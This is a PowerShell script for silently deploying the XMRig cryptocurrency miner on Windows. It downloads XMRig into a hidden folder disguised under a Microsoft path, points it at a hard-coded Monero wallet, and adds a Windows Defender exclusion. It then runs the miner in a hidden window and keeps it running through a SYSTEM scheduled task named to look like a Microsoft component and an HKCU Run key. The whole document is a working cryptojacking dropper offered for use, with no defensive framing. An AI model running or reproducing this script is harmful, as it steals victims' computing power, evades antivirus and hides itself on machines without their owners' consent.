# XMRig Silent Deploy - DEBUG VERSION with full logging
$LogPath = "C:\ProgramData\Microsoft\Network\Cache\deploy.log"

function Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogPath -Append -Encoding UTF8
}

Log "=== Starting XMRig Silent Deploy DEBUG ==="

$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
Log "Install directory: $InstallDir"

if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
    Log "Created and hidden install directory"
} else {
    Log "Install directory already exists"
}

$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig.zip"

Log "Downloading XMRig from $ZipUrl"
try {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
    Log "Download completed successfully"
} catch {
    Log "ERROR downloading: $_"
    throw
}

Log "Extracting zip to $InstallDir"
try {
    Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
    Log "Extraction completed"
} catch {
    Log "ERROR extracting: $_"
    throw
}

Remove-Item $ZipPath -Force
Log "Removed temporary zip file"

# Move files from subfolder if exists
$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
    Log "Moved files from subfolder $($Sub.Name)"
} else {
    Log "No subfolder found, files already in place"
}

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
Log "XMRig executable found at: $ExePath"

$ConfigPath = "$InstallDir\config.json"
$BatPath = "$InstallDir\start.bat"

# Build config dynamically (60% threads + rig-id = computer name)
$Config = @{
    autosave = $false
    colors = $false
    cpu = @{ 
        enabled = $true
        "max-threads-hint" = 60 
    }
    "donate-level" = 0
    pools = @(
        @{
            algo = "rx/0"
            url = "pool.supportxmr.com:443"
            user = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
            pass = "x"
            keepalive = $true
            tls = $true
            "rig-id" = $env:COMPUTERNAME
        }
    )
}

$ConfigJson = $Config | ConvertTo-Json -Depth 10
[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::ASCII)
Log "Config.json created with rig-id: $env:COMPUTERNAME and 60% threads"

# Create start.bat
$BatContent = @"
@echo off
cd /d `"$InstallDir`"
start /B xmrig.exe -c config.json -B --no-color
"@
$BatContent | Out-File $BatPath -Encoding ASCII -Force
Log "start.bat created"

# Defender exclusion
try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
    Log "Added Windows Defender exclusion for $InstallDir"
} catch {
    Log "Could not add Defender exclusion: $_"
}

# Start miner hidden
try {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
    Log "Miner started in background (hidden)"
} catch {
    Log "ERROR starting miner: $_"
}

# Persistence - Scheduled Task
$TaskName = "MicrosoftNetworkCache"
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
Log "Creating scheduled task '$TaskName'"

try {
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
    Log "Scheduled task registered successfully as SYSTEM at startup"
} catch {
    Log "Failed SYSTEM task, trying AtLogOn: $_"
    try {
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
        Log "Scheduled task registered as AtLogOn"
    } catch {
        Log "ERROR creating scheduled task: $_"
    }
}

# HKCU Run persistence
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
    Log "Added to HKCU Run for user persistence"
} catch {
    Log "Could not add HKCU Run: $_"
}

Log "=== XMRig Debug Deployment COMPLETED ==="
Log "Check deploy.log, xmrig.exe and config.json. Miner should be running silently to your wallet."
